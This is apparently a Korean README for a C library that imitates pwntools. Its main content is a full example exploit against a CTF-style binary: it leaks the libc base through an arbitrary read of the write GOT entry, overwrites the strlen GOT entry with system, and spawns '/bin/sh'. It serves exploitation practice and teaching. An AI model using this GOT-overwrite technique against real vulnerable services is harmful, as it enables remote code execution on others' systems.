# Untitled

# PwnExploitByC

공업 일반 프로젝트를 계기로 c언어로 got, libc의 sym 등을 가져오는 함수들을 만들어보았습니다.

[주요 함수](https://www.notion.so/5d8c176b084247a4b2568f3651e4f6df)

아래는 예제 코드

```c
#include "pwnc.h"
#define MODE LOCAL

void io32(int a, int print){
    char * tmp = (char * )p32(a);
    Recvuntil("> ", print);
    Send32(tmp);
    free(tmp);
}

void io64(unsigned long long a, int print){
    char * tmp = (char * ) p64(a);
    Recvuntil("> ", print);
    Send64(tmp);
    free(tmp);
}

void arb_write(unsigned long long addr, unsigned long long value, int print){
    
    //io32(0, print);
    Recvuntil(">", print);
    Send32((char *)p32(0));

    io64(addr, print);
    io64(value, print);
    io32(8, print);

    Recvuntil("OK\n", print);
}

unsigned long long * arb_read(unsigned long long addr, unsigned long long size, int print){
    unsigned long long * ret;

    io32(1, print);
    io64(addr, print);
    io64(size, print);

    Recv(1, print); // ' ' 때문에 1바이트를 먼저 받아준다.
    ret = (unsigned long long *)Recv(8, print);
    Recvuntil("OK\n", print);
    
    printf("\n");
    hexdump(ret, 16);
    printf("\n");

    return ret;
}

void dummy(char * s, int print){
    io32(2, print);
    Recvuntil("> ", print);
    Sendline(s);
    Recvuntil("OK\n", print);
}

int main(){
    setvbuf(stdout, NULL, _IONBF, 0); // printf 함수 사용시 버퍼링 때문에 잘 출력이 안되는 경우가 있었음.
    unsigned long long LibcAddr;   
    
    ELFInfo elf = ELF("./prob");
    // ELFInfo libc = getLibcELF(elf);
    ELFInfo libc = ELF("/lib/x86_64-linux-gnu/libc.so.6");
    unsigned long long * WriteAddr;
    
    if(MODE == REMOTE) remote("localhost", 9000);
    else if(MODE == LOCAL) process("./prob");
    else {
        printf("set mode LOCAL or REMOTE");
        exit(0);
    }

    dummy("a", 0); // 바이너리의 dummy함수는 strlen 함수를 사용합니다. 따라서 dummy함수를 한번이라도 실행한다면 strlen 함수의 got에 strlen 함수의 실제주소가 들어가게 된다.
    
    WriteAddr = arb_read(getGOT(elf.got, "write"), 8, 0);
    LibcAddr = *WriteAddr - getSYM(libc.sym, "write");
    printf("[*] Libc address = %p\n", (void *)LibcAddr);

    arb_write(getGOT(elf.got, "strlen"), LibcAddr + getSYM(libc.sym, "system"), 0);
    
    io32(2, 0);
    Recvuntil("> ", 0);
    Sendline("/bin/sh");
   	
	
    interactive();
}
```

실행사진

![readme/Untitled.png](Untitled%200ca70cf006734e57bac42a0d28de09f7/Untitled.png)
